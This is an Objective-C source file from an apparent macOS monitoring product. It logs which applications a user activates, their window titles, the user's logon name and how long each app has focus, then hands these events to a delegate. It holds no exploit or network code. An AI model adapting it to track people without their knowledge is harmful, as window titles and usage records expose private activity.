//
//  ApplicationUsage.m
//  ApplicationUsageCaptureManager
//
//  Created by ophat on 2/5/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "ApplicationUsage.h"

#import "DateTimeFormat.h"
#import "FxApplicationUsageEvent.h"
#import "SystemUtilsImpl.h"

@implementation ApplicationUsage
@synthesize mTimerKeeper;
@synthesize mDelegate, mSelector;

- (id) init {
    self = [super init];
    if (self) {
        self.mTimerKeeper = [NSMutableArray array];
    }
    return (self);
}

-(void)startCapture{
    [self stopCapture];
    
    DLog(@"Start ApplicationUsage");
    self.mTimerKeeper = [NSMutableArray array];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(active:)  name:NSWorkspaceDidActivateApplicationNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(deactive:)  name:NSWorkspaceDidDeactivateApplicationNotification  object:nil];
}

-(void)stopCapture{
    DLog(@"Stop ApplicationUsage");
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidActivateApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidDeactivateApplicationNotification object:nil];
    self.mTimerKeeper = nil;
}

-(void) active:(NSNotification *)notification {
    NSDictionary *userInfo = [notification userInfo];
    NSRunningApplication * app = [userInfo objectForKey:[[userInfo allKeys]objectAtIndex:0]];
    NSString *bundleID = [app bundleIdentifier];
    
    if (![bundleID isEqualToString:[[NSBundle mainBundle] bundleIdentifier]] &&
        ![bundleID isEqualToString:@"com.apple.ScreenSaver.Engine"] &&
        ![bundleID isEqualToString:@"com.apple.loginwindow"] ){
      
        NSString *localizedName = [app localizedName];
        NSString *title = [SystemUtilsImpl frontApplicationWindowTitle];
        if (!bundleID) bundleID = @"";
        if (!localizedName) localizedName = @"";
        if (!title) title = @"";

        int indexFound = [self IsAppExistInArray:bundleID];
        if (indexFound != -1) {
            DLog(@"Replace StartTime %@",mTimerKeeper);
            [[mTimerKeeper objectAtIndex:indexFound] replaceObjectAtIndex:3 withObject:[NSDate date]];
        }else{
            NSMutableArray * usageInfo = [[NSMutableArray alloc]init];
            [usageInfo addObject:bundleID];
            [usageInfo addObject:localizedName];
            [usageInfo addObject:title];
            [usageInfo addObject:[NSDate date]];
            [mTimerKeeper addObject:usageInfo];
            [usageInfo release];
        }
    }
}

-(void) deactive:(NSNotification *)notification {
    NSDictionary *userInfo = [notification userInfo];
    NSRunningApplication * app = [userInfo objectForKey:[[userInfo allKeys]objectAtIndex:0]];
    
    NSDate * endTime = [NSDate date];
    
    for (int i =0; i < [mTimerKeeper count]; i++) {
        NSMutableArray * usageInfo = [mTimerKeeper objectAtIndex:i];
        NSString *bundleID  = [usageInfo objectAtIndex:0];
        NSString *name      = [usageInfo objectAtIndex:1];
        NSString *title     = [usageInfo objectAtIndex:2];
        NSDate   *startTime = [usageInfo objectAtIndex:3];
        if ([bundleID isEqualToString:[app bundleIdentifier]]) {
            
            NSDateFormatter *df = [[[NSDateFormatter alloc] init] autorelease];
            [df setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
            
            NSCalendar *gregorianCalendar = [[NSCalendar alloc] initWithCalendarIdentifier:NSCalendarIdentifierGregorian]; // NSGregorianCalendar deprecated
            NSUInteger unitFlags =  NSCalendarUnitSecond;
            NSDateComponents *components = [gregorianCalendar components:unitFlags
                                                                fromDate:startTime
                                                                  toDate:endTime
                                                                 options:0];
            [gregorianCalendar release];
            int totalused = (int)[components second];
            
            NSThread *myThread = [NSThread currentThread];
            dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
                
                NSNumber *pid = [NSNumber numberWithInteger:[app processIdentifier]];
                NSString *deactiveTitle = [SystemUtilsImpl frontApplicationWindowTitleWithPID:pid];

            
                if (!deactiveTitle) {deactiveTitle = title;}

                if ([mDelegate respondsToSelector:mSelector] && totalused > 0 ) {
                    /*
                    DLog(@"#### Deactive and Send Data");
                    DLog(@"App ID     : %@",bundleID);
                    DLog(@"App Name   : %@",name);
                    DLog(@"App title  : %@",title);
                    DLog(@"App title2 : %@",deactiveTitle);
                    DLog(@"Start Time : %@",[DateTimeFormat phoenixDateTime:startTime]);
                    DLog(@"End Time   : %@",[DateTimeFormat phoenixDateTime:endTime]);
                    DLog(@"Total Used : %d",totalused);*/
                    
                    FxApplicationUsageEvent *applicationUsageEvent = [[FxApplicationUsageEvent alloc] init];
                    [applicationUsageEvent setDateTime:[DateTimeFormat phoenixDateTime]];
                    [applicationUsageEvent setMUserLogonName:[SystemUtilsImpl userLogonName]];
                    [applicationUsageEvent setMApplicationID:bundleID];
                    [applicationUsageEvent setMApplicationName:name];
                    [applicationUsageEvent setMTitle:deactiveTitle];
                    [applicationUsageEvent setMActiveFocusTime:[DateTimeFormat phoenixDateTime:startTime]];
                    [applicationUsageEvent setMLostFocusTime:[DateTimeFormat phoenixDateTime:endTime]];
                    [applicationUsageEvent setMDuration:(NSUInteger)totalused];
                    //[mDelegate performSelector:mSelector onThread:myThread withObject:applicationUsageEvent];
                    [mDelegate performSelector:mSelector onThread:myThread withObject:applicationUsageEvent waitUntilDone:NO];
                    [applicationUsageEvent release];
                }
            });
            
            if (totalused > 0) {
                [mTimerKeeper removeObjectAtIndex:i];
                i--;
            }
            
            break;
            
        }
    }
}


-(int) IsAppExistInArray:(NSString *)aAppID{
    int index = -1;
    for (int i =0; i < [mTimerKeeper count]; i++) {
        NSMutableArray * usageInfo = [mTimerKeeper objectAtIndex:i];
        NSString *bundleID  = [usageInfo objectAtIndex:0];
        if ([bundleID isEqualToString:aAppID]) {
            index = i;
            break;
        }
    }
    return index;
}
-(void)dealloc{
    [self stopCapture];
    [mTimerKeeper release];
    [super dealloc];
}
@end
